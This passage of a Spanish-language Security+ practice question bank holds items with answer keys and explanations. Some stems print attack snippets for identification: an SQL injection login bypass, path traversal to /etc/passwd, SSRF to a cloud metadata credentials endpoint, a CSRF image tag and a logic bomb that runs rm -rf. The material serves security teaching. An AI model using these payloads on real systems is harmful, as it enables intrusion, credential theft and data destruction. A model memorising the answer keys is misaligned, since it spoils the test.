reposo."},{"id":"D1-035","domain":1,"objective":"1.4","type":"single","difficulty":2,"stem":"Una dependencia de gobierno usa full-disk encryption en sus portátiles y necesita poder recuperar la información si un empleado olvida su contraseña o deja la organización. Para ello, las claves de cifrado se almacenarán con un tercero de confianza. ¿Qué concepto describe MEJOR este arreglo?","options":["Key stretching","Tokenization","OCSP stapling","Key escrow"],"answer":[3],"explanation":"Key escrow consiste en que un tercero de confianza custodie copias de las claves de cifrado para recuperarlas bajo condiciones definidas. Key stretching fortalece contraseñas débiles, tokenization sustituye datos sensibles por tokens y OCSP stapling sirve para verificar la revocación de certificados."},{"id":"D1-036","domain":1,"objective":"1.4","type":"single","difficulty":2,"stem":"Un consorcio de empresas de logística necesita un registro de transacciones distribuido entre todos los participantes, donde cualquiera pueda verificar el historial y cada bloque incluya el hash del bloque anterior, de modo que cualquier alteración sea evidente. ¿Qué tecnología cumple MEJOR este requisito?","options":["Blockchain","Certificate Revocation List (CRL)","Key escrow","Tokenization"],"answer":[0],"explanation":"Blockchain es un registro (ledger) distribuido entre los participantes —CompTIA lo describe como open public ledger— en el que cada bloque se encadena al anterior mediante su hash, lo que hace evidente cualquier manipulación. La CRL lista certificados revocados, key escrow custodia claves y tokenization sustituye datos sensibles; ninguno ofrece un registro distribuido y verificable."},{"id":"D2-001","domain":2,"objective":"2.1","type":"single","difficulty":1,"stem":"Un grupo de adolescentes descarga desde un foro un script de explotación ya hecho y lo usa para modificar la página principal de un sitio municipal. No dejan ningún mensaje político; solo publican capturas en redes sociales para presumir. ¿Qué tipo de actor de amenaza describe MEJOR este escenario?","options":["Organized crime","Hacktivist","Unskilled attacker","Nation-state"],"answer":[2],"explanation":"Un unskilled attacker usa herramientas y exploits creados por otros, con poca sofisticación y recursos, a menudo por notoriedad. No hay motivación política (hacktivist), ni financiera estructurada (organized crime), ni los recursos y objetivos estratégicos de un nation-state."},{"id":"D2-002","domain":2,"objective":"2.1","type":"single","difficulty":2,"stem":"Un contratista de defensa descubre que un atacante ha permanecido 14 meses dentro de su red usando exploits zero-day personalizados e infraestructura de comando y control dedicada. Solo se extrajeron planos de investigación de un nuevo sistema de radar; no hubo demanda de rescate. ¿Qué actor de amenaza es el MÁS probable?","options":["Hacktivist","Insider threat","Nation-state","Organized crime"],"answer":[2],"explanation":"La larga permanencia (APT), los zero-days personalizados y el enfoque en propiedad intelectual militar indican un nation-state con gran financiamiento y motivación de espionaje. Organized crime buscaría ganancia financiera, un hacktivist publicitaría su causa y nada sugiere un insider."},{"id":"D2-003","domain":2,"objective":"2.1","type":"single","difficulty":2,"stem":"Un hospital sufre el cifrado de sus servidores. La nota de rescate incluye un portal de \"atención al cliente\", un plazo de pago en criptomonedas y menciona un programa de afiliados que comparte las ganancias. ¿Qué actor de amenaza y motivación describen MEJOR este incidente?","options":["Hacktivist con motivación filosófica/política","Organized crime con motivación de ganancia financiera","Nation-state con motivación de espionaje","Unskilled attacker con motivación de caos"],"answer":[1],"explanation":"La estructura empresarial (Ransomware-as-a-Service, afiliados, soporte a víctimas) y la exigencia de pago son característicos del crimen organizado motivado por dinero. Un nation-state priorizaría el espionaje o la disrupción estratégica, un hacktivist una causa y un unskilled attacker no tendría esa organización."},{"id":"D2-004","domain":2,"objective":"2.1","type":"single","difficulty":1,"stem":"El departamento de marketing contrata con una tarjeta corporativa un servicio SaaS para compartir archivos con agencias externas, sin informar ni pedir aprobación al área de TI. ¿Qué término describe MEJOR esta situación?","options":["Hacktivism","Shadow IT","Insider threat malicioso","Supply chain attack"],"answer":[1],"explanation":"Shadow IT es el uso de tecnología o servicios sin la aprobación ni el control de TI, lo que crea superficies de ataque no gestionadas. No hay intención maliciosa (insider malicioso), ni compromiso de un proveedor (supply chain), ni motivación ideológica."},{"id":"D2-005","domain":2,"objective":"2.1","type":"single","difficulty":2,"stem":"Tras ser excluido de una promoción, un administrador de bases de datos elimina en la madrugada los respaldos de producción. No intenta vender información ni pide nada a cambio; deja una nota diciendo que la empresa \"se lo merecía\". ¿Cuál es la motivación MÁS probable?","options":["Revenge","Espionage","Blackmail","Financial gain"],"answer":[0],"explanation":"La acción responde a un agravio personal sin beneficio económico ni exigencias, lo que indica venganza (revenge). Blackmail implicaría una exigencia a cambio de no causar daño, financial gain una ganancia económica y espionage la obtención encubierta de información."},{"id":"D2-006","domain":2,"objective":"2.1","type":"single","difficulty":3,"stem":"Un analista compara dos grupos externos con motivación política. El grupo A realiza ataques DDoS con herramientas públicas durante protestas. El grupo B desarrolla malware propio, compra zero-days y mantiene infraestructura durante años. ¿Qué atributo de los actores de amenaza explica MEJOR la diferencia entre ambos?","options":["Uso de shadow IT","Ubicación interna o externa (internal/external)","Recursos/financiamiento (resources/funding)","Motivación filosófica/política"],"answer":[2],"explanation":"Ambos son externos y comparten motivación política; lo que los diferencia es el nivel de recursos y financiamiento, que habilita mayor sofisticación (zero-days, infraestructura persistente). Shadow IT no es un atributo de actores de amenaza externos."},{"id":"D2-007","domain":2,"objective":"2.1","type":"multi","difficulty":1,"stem":"¿Qué características describen MEJOR a un hacktivist? (Elige DOS.)","options":["Siempre es un empleado interno de la organización atacada","Está motivado por creencias filosóficas, políticas o sociales","Su objetivo principal es la ganancia financiera mediante extorsión","Opera principalmente como herramienta de TI no autorizada por la empresa","Suele recurrir a defacement, DDoS o filtración de datos para dar visibilidad a su causa","Normalmente dispone de más financiamiento que un nation-state"],"answer":[1,4],"explanation":"Los hacktivists actúan por causas ideológicas y buscan notoriedad con ataques visibles como defacement, DDoS o filtraciones. No suelen tener los recursos de un nation-state, la ganancia financiera es propia del crimen organizado, pueden ser externos y shadow IT es un concepto distinto."},{"id":"D2-008","domain":2,"objective":"2.1","type":"match","difficulty":2,"stem":"Empareja cada escenario con la motivación del actor de amenaza que MEJOR lo describe.","items":["Un agente extranjero se infiltra para robar los diseños de un nuevo producto.","Un colectivo filtra documentos internos para protestar contra la deforestación causada por una minera.","Un grupo ataca la red eléctrica de un país adversario durante un conflicto armado.","Un atacante obtiene fotos privadas de un ejecutivo y exige un pago para no publicarlas.","Un actor borra datos al azar en varias empresas sin exigir nada, solo para provocar desorden.","Un investigador encuentra una vulnerabilidad y la reporta al fabricante sin pedir pago."],"choices":["War","Blackmail","Espionage","Disruption/chaos","Philosophical/political","Ethical"],"answer":[2,4,0,1,3,5],"explanation":"Atacar infraestructura en un conflicto es war; exigir pago a cambio de no publicar es blackmail; robar diseños de forma encubierta es espionage; dañar sin objetivo ni exigencia es disruption/chaos; filtrar por una causa es philosophical/political; reportar responsablemente sin beneficio es ethical."},{"id":"D2-009","domain":2,"objective":"2.2","type":"single","difficulty":1,"stem":"Varios empleados reciben un mensaje de texto: \"Su paquete no pudo entregarse. Actualice su dirección en http://entregas-mx.co/r?id=8812\". ¿Qué tipo de ataque es este?","options":["Watering hole","Vishing","Pretexting","Smishing"],"answer":[3],"explanation":"Smishing es phishing a través de SMS. Vishing usa llamadas de voz, pretexting es la construcción de una historia falsa (puede acompañar a cualquier vector) y watering hole compromete un sitio que las víctimas visitan habitualmente."},{"id":"D2-010","domain":2,"objective":"2.2","type":"single","difficulty":2,"stem":"El director financiero recibe un correo desde la cuenta legítima del CEO, que fue comprometida días antes. El mensaje pide transferir con urgencia USD 85,000 a la \"nueva cuenta bancaria\" de un proveedor conocido y solicita discreción. ¿Qué tipo de ataque es el MÁS probable?","options":["Brand impersonation","Typosquatting","Business email compromise (BEC)","Watering hole"],"answer":[2],"explanation":"BEC usa cuentas de correo empresariales comprometidas o suplantadas para engañar a empleados y obtener transferencias o datos. Aquí no hay un dominio mal escrito (typosquatting), ni suplantación de una marca ante clientes, ni compromiso de un sitio web frecuentado."},{"id":"D2-011","domain":2,"objective":"2.2","type":"single","difficulty":2,"stem":"Un atacante quiere comprometer a ingenieros de varias empresas de energía. En lugar de atacarlas directamente, inyecta un exploit en un foro técnico especializado que esos ingenieros visitan a diario. ¿Qué técnica está utilizando?","options":["Business email compromise","Watering hole","Typosquatting","Pretexting"],"answer":[1],"explanation":"Un ataque watering hole compromete un sitio legítimo que el grupo objetivo visita con frecuencia, esperando que las víctimas lleguen a él. Typosquatting depende de errores al escribir dominios, pretexting de historias falsas y BEC del correo empresarial."},{"id":"D2-012","domain":2,"objective":"2.2","type":"single","difficulty":1,"stem":"Un atacante registra los dominios `amaz0n-pagos.com` y `amazon-pgos.com` para recibir el tráfico de usuarios que escriben mal la dirección y presentarles una página falsa de inicio de sesión. ¿Qué técnica describe MEJOR esta acción?","options":["Typosquatting","DNS cache poisoning","Watering hole","Vishing"],"answer":[0],"explanation":"Typosquatting (URL hijacking) consiste en registrar dominios con errores tipográficos comunes para capturar a usuarios que se equivocan al escribir. DNS poisoning altera la resolución de un dominio legítimo, watering hole compromete un sitio real y vishing usa llamadas."},{"id":"D2-013","domain":2,"objective":"2.2","type":"single","difficulty":2,"stem":"Clientes de una aerolínea reportan una cuenta en redes sociales con el logotipo, los colores y el tono de comunicación oficiales que ofrece \"vuelos gratis\" a cambio de llenar un formulario con datos de tarjeta. El nombre de la cuenta no usa ningún dominio web. ¿Qué técnica se está utilizando?","options":["Watering hole","Business email compromise","Typosquatting","Brand impersonation"],"answer":[3],"explanation":"Brand impersonation imita la identidad visual y el estilo de una marca para engañar a sus clientes. No hay registro de dominios mal escritos (typosquatting), ni compromiso de correo empresarial interno (BEC), ni sitio legítimo comprometido (watering hole)."},{"id":"D2-014","domain":2,"objective":"2.2","type":"single","difficulty":1,"stem":"Una persona con uniforme de una empresa de aire acondicionado llega a la recepción con una orden de trabajo impresa y explica que debe revisar \"urgentemente\" el equipo del cuarto de servidores porque el gerente de instalaciones lo programó. ¿Cómo se denomina la historia fabricada que usa para justificar su acceso?","options":["Typosquatting","Smishing","Pretexting","Watering hole"],"answer":[2],"explanation":"Pretexting es crear un escenario o pretexto creíble para convencer a la víctima de dar acceso o información. Watering hole y typosquatting son técnicas web, y smishing se realiza por SMS."},{"id":"D2-015","domain":2,"objective":"2.2","type":"single","difficulty":3,"stem":"Una empresa evalúa dos herramientas de administración remota. La opción 1 requiere instalar un agente persistente con privilegios en cada equipo. La opción 2 es agentless y se conecta mediante protocolos existentes del sistema operativo. Desde la perspectiva de superficie de ataque, ¿qué afirmación es la MÁS precisa?","options":["La solución agentless elimina por completo las vulnerabilidades, ya que no se instala software","La solución client-based agrega en cada equipo un software que puede tener vulnerabilidades propias y debe parcharse y mantenerse en todos los endpoints","La solución client-based reduce la superficie de ataque porque el agente siempre cifra sus comunicaciones","La solución agentless no puede ser explotada de forma remota porque no expone ningún servicio"],"answer":[1],"explanation":"El software client-based introduce un componente vulnerable adicional en cada endpoint, ampliando la superficie de ataque y la carga de parcheo. Agentless reduce ese riesgo, pero no elimina vulnerabilidades: depende de servicios y credenciales de acceso remoto que también pueden ser atacados; el cifrado no elimina las fallas del propio agente."},{"id":"D2-016","domain":2,"objective":"2.2","type":"single","difficulty":2,"stem":"Atacantes comprometen la plataforma de monitoreo y administración remota (RMM) de un proveedor de servicios administrados y la usan para desplegar ransomware en decenas de clientes de ese proveedor al mismo tiempo. ¿Qué vector de amenaza se explotó?","options":["Insider threat","Watering hole","Supply chain","Removable device"],"answer":[2],"explanation":"Comprometer a un MSP de confianza para llegar a sus clientes es un ataque de supply chain: el acceso legítimo del proveedor se convierte en vector. En SY0-701, los MSP se incluyen explícitamente entre los vectores de supply chain (junto con vendors y suppliers). No se compromete un sitio web visitado (watering hole), no hay empleados internos maliciosos ni uso de medios extraíbles."},{"id":"D2-017","domain":2,"objective":"2.2","type":"single","difficulty":3,"stem":"Un competidor contrata a una red de cuentas falsas para difundir deliberadamente en redes sociales que la aplicación de una fintech \"filtra datos bancarios\", algo que sabe que es falso, con el fin de dañar su reputación. ¿Qué describe MEJOR esta campaña?","options":["Disinformation","Misinformation","Watering hole","Brand impersonation"],"answer":[0],"explanation":"Disinformation es información falsa difundida intencionalmente para engañar o causar daño. Misinformation es información incorrecta compartida sin intención maliciosa; aquí el origen es deliberado. No se imita la marca (brand impersonation) ni se compromete un sitio (watering hole)."},{"id":"D2-018","domain":2,"objective":"2.2","type":"multi","difficulty":2,"stem":"Durante una prueba de penetración interna se obtiene el siguiente resultado:\n```\nPORT    STATE  SERVICE\n23/tcp  open   telnet\n80/tcp  open   http\n[+] 10.10.4.1:23 - Login successful: admin/admin\n```\n¿Qué DOS vectores de amenaza se evidencian? (Elige DOS.)","options":["Open service ports","Typosquatting","Image-based","Removable device","Bluetooth","Default credentials"],"answer":[0,5],"explanation":"El servicio Telnet expuesto es un open service port innecesario e inseguro, y el acceso con admin/admin demuestra credenciales predeterminadas sin cambiar. Bluetooth, vectores basados en imágenes, medios extraíbles y typosquatting no aparecen en la evidencia."},{"id":"D2-019","domain":2,"objective":"2.2","type":"match","difficulty":2,"stem":"Empareja cada escenario con el vector de amenaza correspondiente.","items":["Un usuario recibe una llamada de su \"banco\" pidiendo el código que acaba de llegarle por SMS.","Un archivo SVG enviado por chat contiene JavaScript incrustado que se ejecuta al abrirlo en el navegador.","Un correo incluye un documento de Office con macros que descargan malware.","Se encuentran memorias USB con la etiqueta \"Nómina 2026\" en el estacionamiento de la empresa.","Una estación HMI de la planta sigue operando con Windows XP, para el que el fabricante ya no publica actualizaciones de seguridad.","Un empleado se conecta a una red Wi-Fi abierta y sin cifrado en una cafetería para acceder a sistemas internos."],"choices":["Image-based","Removable device","File-based","Voice call","Unsecure networks","Unsupported systems"],"answer":[3,0,2,1,5,4],"explanation":"El SVG con código es image-based; las USB abandonadas son removable device (baiting); el documento con macros es file-based; la llamada fraudulenta es voice call (vishing); la Wi-Fi abierta es una unsecure network; y el equipo con Windows XP es un unsupported system, ya que sus vulnerabilidades nunca se corregirán."},{"id":"D2-020","domain":2,"objective":"2.3","type":"single","difficulty":2,"stem":"Un programa con privilegios verifica que el usuario tenga permiso sobre `/tmp/reporte.txt` y, milisegundos después, abre el archivo para escribir. Un atacante reemplaza el archivo por un enlace simbólico a `/etc/shadow` justo entre ambas operaciones. ¿Qué vulnerabilidad se está explotando?","options":["Race condition de tipo time-of-check to time-of-use (TOC/TOU)","Malicious update","Memory injection","Buffer overflow"],"answer":[0],"explanation":"TOC/TOU es una race condition en la que el estado de un recurso cambia entre el momento en que se verifica y el momento en que se usa. No se desborda memoria (buffer overflow), no se inyecta código en un proceso (memory injection) ni se distribuye una actualización maliciosa."},{"id":"D2-021","domain":2,"objective":"2.3","type":"single","difficulty":1,"stem":"Una aplicación en C copia la entrada del usuario en un arreglo de 64 bytes sin validar la longitud. Un atacante envía 600 bytes que sobrescriben la dirección de retorno de la función. ¿Qué tipo de vulnerabilidad es esta?","options":["SQL injection","Buffer overflow","Race condition","Resource reuse"],"answer":[1],"explanation":"Escribir más datos de los que caben en un búfer y sobrescribir memoria adyacente (como la dirección de retorno) es un buffer overflow. SQL injection afecta consultas a bases de datos, una race condition depende de la temporización y resource reuse de recursos reasignados sin limpiar."},{"id":"D2-022","domain":2,"objective":"2.3","type":"single","difficulty":3,"stem":"El EDR alerta que un proceso desconocido abrió un handle a `explorer.exe`, reservó memoria con permisos de ejecución dentro de él y creó un hilo remoto para ejecutar código. No se escribió ningún archivo nuevo en disco. ¿Qué vulnerabilidad o técnica describe MEJOR esta actividad?","options":["Memory injection","Side loading","Resource reuse","Race condition"],"answer":[0],"explanation":"Memory injection introduce código malicioso en el espacio de memoria de un proceso legítimo para ejecutarlo con su identidad y evadir la detección, a menudo sin archivos en disco. Side loading es instalar apps fuera de la tienda oficial; race condition y resource reuse no implican inyección de código."},{"id":"D2-023","domain":2,"objective":"2.3","type":"single","difficulty":2,"stem":"Un fabricante de software legítimo sufre la intrusión de su servidor de compilación. La siguiente versión de su producto, firmada digitalmente con el certificado del fabricante, se distribuye automáticamente a miles de clientes con una puerta trasera incluida. ¿Qué tipo de vulnerabilidad de aplicación se materializó?","options":["Malicious update","Jailbreaking","Zero-day","Buffer overflow"],"answer":[0],"explanation":"Un malicious update es una actualización aparentemente legítima (incluso firmada) que contiene código malicioso, normalmente por compromiso del proceso de desarrollo o distribución. No se explota una falla desconocida en el código (zero-day), un desbordamiento de memoria ni la eliminación de restricciones de un dispositivo móvil."},{"id":"D2-024","domain":2,"objective":"2.3","type":"single","difficulty":1,"stem":"Un atacante con acceso a una máquina virtual en un servidor compartido explota una falla del hipervisor y logra ejecutar comandos en el host físico, desde donde accede a otras máquinas virtuales. ¿Qué vulnerabilidad se explotó?","options":["Side loading","Directory traversal","Resource reuse","VM escape"],"answer":[3],"explanation":"VM escape ocurre cuando un atacante rompe el aislamiento de una máquina virtual para interactuar con el hipervisor u otras VM. Resource reuse se refiere a datos residuales en recursos reasignados, side loading a apps móviles y directory traversal a rutas de archivos en aplicaciones web."},{"id":"D2-025","domain":2,"objective":"2.3","type":"single","difficulty":3,"stem":"Al aprovisionar un nuevo volumen de almacenamiento en un proveedor de nube pública, un analista forense encuentra fragmentos legibles de datos de facturación que pertenecen a otro cliente del proveedor. ¿Qué vulnerabilidad de virtualización describe MEJOR este hallazgo?","options":["Race condition","VM escape","Firmware vulnerability","Resource reuse"],"answer":[3],"explanation":"Resource reuse ocurre cuando memoria o almacenamiento se reasigna a otro inquilino sin sanitizarse, exponiendo datos residuales. VM escape implica romper el aislamiento activamente; aquí el analista solo recibió un recurso con datos previos. Las race conditions y las fallas de firmware no explican el hallazgo."},{"id":"D2-026","domain":2,"objective":"2.3","type":"single","difficulty":1,"stem":"Un empleado descarga un archivo APK desde un sitio web de terceros para instalar una versión \"premium gratuita\" de una aplicación en su teléfono Android corporativo, sin usar la tienda oficial. ¿Cómo se denomina esta práctica?","options":["Memory injection","Jailbreaking","Side loading","Malicious update"],"answer":[2],"explanation":"Side loading es instalar aplicaciones desde fuentes distintas a la tienda oficial, evitando sus controles de revisión. Jailbreaking es eliminar las restricciones del sistema operativo (principalmente iOS); aquí el usuario no modificó el sistema. No hay actualización maliciosa ni inyección en memoria."},{"id":"D2-027","domain":2,"objective":"2.3","type":"single","difficulty":3,"stem":"Se publica un CVE crítico para el firmware de los switches de núcleo de una empresa. Hace dos años el fabricante dejó de dar soporte a ese modelo y anunció que no publicará más actualizaciones. ¿Qué afirmación describe MEJOR la situación?","options":["Es una vulnerabilidad de resource reuse propia de la infraestructura compartida","Es una vulnerabilidad de hardware end-of-life: la falla es conocida, pero nunca se corregirá y requiere controles compensatorios o reemplazo","Es una vulnerabilidad zero-day porque no existe un parche disponible","Es una misconfiguration que se corrige ajustando la configuración actual del switch"],"answer":[1],"explanation":"El equipo EOL no recibirá parches de firmware, por lo que la vulnerabilidad persistirá; se deben aplicar controles compensatorios (segmentación, monitoreo) y planear el reemplazo. No es zero-day, porque la falla ya es conocida y fue publicada; tampoco es un error de configuración ni resource reuse."},{"id":"D2-028","domain":2,"objective":"2.3","type":"multi","difficulty":2,"stem":"Una auditoría de la cuenta de nube de una empresa revela:\n```\n- Bucket \"respaldos-clientes\": lectura pública habilitada\n- Security group sg-web: 0.0.0.0/0 -> TCP 22 (SSH) permitido\n- Cuenta root sin MFA y con claves de acceso activas\n```\n¿Qué DOS categorías de vulnerabilidad describen MEJOR estos hallazgos? (Elige DOS.)","options":["Firmware","Zero-day","Race condition","Misconfiguration","Cloud-specific","Side loading"],"answer":[3,4],"explanation":"Todos los hallazgos son configuraciones inseguras (misconfiguration) en servicios propios de la nube, como buckets, security groups y la cuenta root (cloud-specific). No hay fallas desconocidas (zero-day), apps móviles, problemas de temporización ni de firmware."},{"id":"D2-029","domain":2,"objective":"2.3","type":"match","difficulty":2,"stem":"Empareja cada hallazgo con el tipo de vulnerabilidad que MEJOR lo describe.","items":["Una falla en el kernel permite a cualquier usuario local obtener privilegios de SYSTEM, sin importar qué aplicaciones estén instaladas.","Atacantes explotan una falla que el fabricante desconocía y para la cual no existe parche.","Una aplicación cifra datos con DES y almacena contraseñas con MD5 sin salt.","Un proveedor entrega servidores cuyo firmware de la placa base fue alterado antes de llegar al cliente.","Un iPhone corporativo tiene eliminadas las restricciones de iOS para instalar herramientas no autorizadas.","Un comentario publicado en un foro ejecuta JavaScript en el navegador de cada visitante."],"choices":["Supply chain","Jailbreaking","Zero-day","Cryptographic","Cross-site scripting (XSS)","OS-based"],"answer":[5,2,3,0,1,4],"explanation":"El firmware alterado antes de la entrega es supply chain; eliminar las restricciones de iOS es jailbreaking; una falla desconocida y sin parche es zero-day; DES y MD5 sin salt son algoritmos débiles (cryptographic); el script en un comentario es XSS almacenado; y la falla del kernel es una vulnerabilidad OS-based que afecta a todo lo que corre sobre el sistema."},{"id":"D2-030","domain":2,"objective":"2.4","type":"single","difficulty":1,"stem":"Un analista revisa los registros del servidor web y encuentra:\n```\nPOST /login.php HTTP/1.1\nusername=admin' OR 1=1--&password=x\nHTTP/1.1 302 Found  Location: /dashboard.php\n```\n¿Qué ataque se realizó?","options":["Cross-site scripting (XSS)","SQL injection","Directory traversal","Cross-site request forgery (CSRF)"],"answer":[1],"explanation":"La cadena `' OR 1=1--` cierra la cadena SQL, agrega una condición siempre verdadera y comenta el resto de la consulta, eludiendo la autenticación (la redirección al dashboard indica éxito). XSS inyecta scripts en el navegador, directory traversal usa `../` y CSRF fuerza solicitudes desde la sesión de la víctima."},{"id":"D2-031","domain":2,"objective":"2.4","type":"single","difficulty":1,"stem":"El WAF registra la siguiente solicitud con código de respuesta 200:\n```\nGET /descargas?archivo=../../../../etc/passwd HTTP/1.1\n```\n¿Qué ataque se está intentando?","options":["Server-side request forgery (SSRF)","Buffer overflow","Command injection","Directory traversal"],"answer":[3],"explanation":"Las secuencias `../` buscan salir del directorio permitido para leer archivos arbitrarios del sistema, como `/etc/passwd`: es directory traversal. No se ejecutan comandos del sistema (command injection), no se fuerza al servidor a hacer peticiones a otros destinos (SSRF) ni se envía una entrada sobredimensionada."},{"id":"D2-032","domain":2,"objective":"2.4","type":"single","difficulty":3,"stem":"Una aplicación permite generar miniaturas a partir de una URL de imagen. En los registros aparece:\n```\nPOST /api/thumbnail\n{\"url\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}\nHTTP/1.1 200 OK (1,342 bytes)\n```\n¿Qué ataque es el MÁS probable?","options":["Server-side request forgery (SSRF)","Cross-site scripting (XSS)","Directory traversal","Cross-site request forgery (CSRF)"],"answer":[0],"explanation":"El atacante obliga al servidor a hacer una petición a un recurso interno (el servicio de metadatos de la nube) para obtener credenciales: es SSRF. CSRF abusa del navegador de un usuario autenticado, directory traversal manipula rutas de archivos y XSS ejecuta scripts en el navegador de la víctima."},{"id":"D2-033","domain":2,"objective":"2.4","type":"single","difficulty":2,"stem":"Un usuario con sesión activa en la banca en línea visita un foro que contiene la siguiente etiqueta:\n```\n\u003cimg src=\"https://banco.example/transferir?destino=4471-889&monto=5000\" width=\"0\" height=\"0\">\n```\nMinutos después detecta una transferencia que no autorizó. ¿Qué ataque ocurrió?","options":["Cross-site request forgery (CSRF)","Replay attack","Server-side request forgery (SSRF)","SQL injection"],"answer":[0],"explanation":"CSRF hace que el navegador de un usuario autenticado envíe una solicitud no deseada a un sitio de confianza, aprovechando sus cookies de sesión. En SSRF es el servidor quien realiza la petición; un replay reutiliza tráfico capturado y no hay manipulación de consultas SQL."},{"id":"D2-034","domain":2,"objective":"2.4","type":"single","difficulty":2,"stem":"El SIEM muestra el siguiente patrón en una hora:\n```\n09:01 FAIL user=agarcia  src=203.0.113.7\n09:01 FAIL user=jmorales src=203.0.113.7\n09:02 FAIL user=lruiz    src=203.0.113.7\n... (412 cuentas distintas, 1 intento cada una, password=\"Primavera2026!\")\n09:58 OK   user=pvega    src=203.0.113.7\n```\n¿Qué ataque es el MÁS probable?","options":["Birthday attack","Brute force","Credential replay","Password spraying"],"answer":[3],"explanation":"Probar una sola contraseña común contra muchas cuentas, con pocos intentos por cuenta para evitar bloqueos, es password spraying. Un brute force prueba muchas contraseñas contra una misma cuenta, credential replay reutiliza credenciales o hashes capturados y el birthday attack es un ataque criptográfico contra hashes."},{"id":"D2-035","domain":2,"objective":"2.4","type":"single","difficulty":2,"stem":"Se revisan los registros de autenticación de una usuaria:\n```\n09:02  Login OK   ana.r  IP 189.203.x.x  Guadalajara, MX\n09:05  Logout     ana.r\n09:20  Login OK   ana.r  IP 86.124.x.x   Bucarest, RO\n```\n¿Qué indicador de actividad maliciosa se presenta?","options":["Resource inaccessibility","Concurrent session usage","Impossible travel","Out-of-cycle logging"],"answer":[2],"explanation":"Es físicamente imposible viajar de Guadalajara a Bucarest en 15 minutos, lo que sugiere credenciales comprometidas: impossible travel. No es concurrent session usage porque la primera sesión se cerró antes de la segunda; tampoco hay registros fuera de ciclo ni recursos inaccesibles."},{"id":"D2-036","domain":2,"objective":"2.4","type":"single","difficulty":2,"stem":"Durante una auditoría se encuentra este script programado para ejecutarse cada día a las 02:00 en un servidor de nómina:\n```\n#!/bin/bash\nif ! grep -q \"jlopez\" /etc/passwd; then\n    rm -rf /srv/nomina/*\nfi\n```\n¿Qué tipo de malware es este?","options":["Trojan","Logic bomb","Rootkit","Worm"],"answer":[1],"explanation":"Una logic bomb ejecuta una acción maliciosa cuando se cumple una condición; aquí, borrar la nómina si la cuenta del empleado deja de existir (por ejemplo, tras su despido). No se autopropaga (worm), no oculta su presencia (rootkit) ni se presenta como software legítimo (trojan)."},{"id":"D2-037","domain":2,"objective":"2.4","type":"single","difficulty":3,"stem":"Un servidor muestra tráfico saliente anómalo, pero el Administrador de tareas y `netstat` no muestran procesos ni conexiones sospechosas. Al arrancar desde un medio externo y analizar el disco sin conexión, se encuentra un controlador de kernel no firmado que intercepta llamadas del sistema. ¿Qué tipo de malware es el MÁS probable?","options":["Rootkit","Logic bomb","Keylogger","Bloatware"],"answer":[0],"explanation":"Un rootkit opera con privilegios elevados (a menudo en el kernel) y modifica el sistema para ocultar procesos, archivos y conexiones a las herramientas locales; por eso solo se detecta mediante análisis sin conexión. Un keylogger captura pulsaciones, el bloatware es software innecesario preinstalado y una logic bomb espera una condición."},{"id":"D2-038","domain":2,"objective":"2.4","type":"single","difficulty":2,"stem":"Varios usuarios reportan que `www.banco-ejemplo.com` los lleva a una página de inicio de sesión sospechosa. Desde el DNS interno se obtiene:\n```\n> nslookup www.banco-ejemplo.com 10.0.0.53\nName:    www.banco-ejemplo.com\nAddress: 198.51.100.66   (TTL 604800)\n> nslookup www.banco-ejemplo.com 8.8.8.8\nAddress: 203.0.113.10\n```\n¿Qué ataque es el MÁS probable?","options":["Credential replay","DNS cache poisoning","Typosquatting","Reflected DDoS"],"answer":[1],"explanation":"El servidor DNS interno devuelve una IP distinta a la autoritativa, con un TTL inusualmente largo, para el dominio correcto: su caché fue envenenada. Typosquatting requiere que el usuario escriba mal el dominio; aquí el dominio es correcto. Un DDoS reflejado y un credential replay no alteran la resolución de nombres."},{"id":"D2-039","domain":2,"objective":"2.4","type":"single","difficulty":3,"stem":"El enlace a Internet de una empresa se satura. La captura muestra:\n```\nsrc=\u003cmiles de IPs de resolvers abiertos>:53 -> dst=203.0.113.20  UDP  len=3,980\n(Sin consultas DNS salientes previas desde 203.0.113.20)\n```\nLos análisis indican que se enviaron consultas de ~60 bytes con la IP de la víctima falsificada como origen. ¿Qué ataque describe MEJOR esta actividad?","options":["Ataque de inundación SYN directo desde una botnet","On-path attack","DDoS amplificado y reflejado mediante DNS","DNS cache poisoning"],"answer":[2],"explanation":"Los atacantes falsifican la IP de la víctima en consultas pequeñas a resolvers abiertos, que responden con paquetes mucho mayores hacia la víctima: reflexión (terceros envían el tráfico) más amplificación (factor ~66x). No se altera la caché DNS, no hay interceptación del tráfico y no es un SYN flood directo, ya que el tráfico es UDP/53 desde resolvers."},{"id":"D2-040","domain":2,"objective":"2.4","type":"single","difficulty":2,"stem":"Un usuario se queja de lentitud. Al ejecutar `arp -a` en su equipo se observa:\n```\n192.168.1.1     00-1a-2b-3c-4d-5e   dynamic\n192.168.1.45    00-1a-2b-3c-4d-5e   dynamic\n```\nLa puerta de enlace legítima tiene la MAC 00-50-56-aa-bb-01. ¿Qué ataque es el MÁS probable?","options":["DNS cache poisoning","Replay attack","Amplified DDoS","On-path attack mediante ARP poisoning"],"answer":[3],"explanation":"La IP de la puerta de enlace está asociada a la MAC de otro host (192.168.1.45), lo que indica ARP poisoning para colocarse en medio de la comunicación (on-path). El DNS no está involucrado, un replay reenvía tráfico capturado y un DDoS no altera la tabla ARP."},{"id":"D2-041","domain":2,"objective":"2.4","type":"single","difficulty":2,"stem":"Un cliente y un servidor admiten TLS 1.3, pero la captura de tráfico en una red de hotel muestra que la sesión se negoció con un protocolo obsoleto y un cifrado débil después de que un tercero modificara los mensajes de handshake. ¿Qué ataque criptográfico ocurrió?","options":["Birthday attack","Collision attack","Password spraying","Downgrade attack"],"answer":[3],"explanation":"Un downgrade attack obliga a las partes a usar una versión o un cifrado más débil del que ambas soportan, para facilitar su ruptura. Collision y birthday atacan funciones hash, y password spraying es un ataque a contraseñas."},{"id":"D2-042","domain":2,"objective":"2.4","type":"single","difficulty":3,"stem":"Un atacante prepara dos contratos PDF diferentes que generan el mismo hash MD5. Consigue que la víctima firme digitalmente el contrato inofensivo y luego sustituye el documento por el malicioso, que conserva una firma válida. ¿Qué ataque se realizó?","options":["Replay attack","Collision attack","Downgrade attack","Brute force attack"],"answer":[1],"explanation":"Un collision attack encuentra dos entradas distintas que producen el mismo hash, lo que permite que una firma creada para un documento valide otro. No se fuerza un protocolo más débil (downgrade), no se reenvía tráfico capturado (replay) ni se prueban contraseñas (brute force)."},{"id":"D2-043","domain":2,"objective":"2.4","type":"single","difficulty":2,"stem":"Una empleada está de vacaciones en otro país y conserva su tarjeta de proximidad. Sin embargo, el sistema de control de acceso registra su credencial abriendo la puerta del centro de datos el domingo a las 02:14. 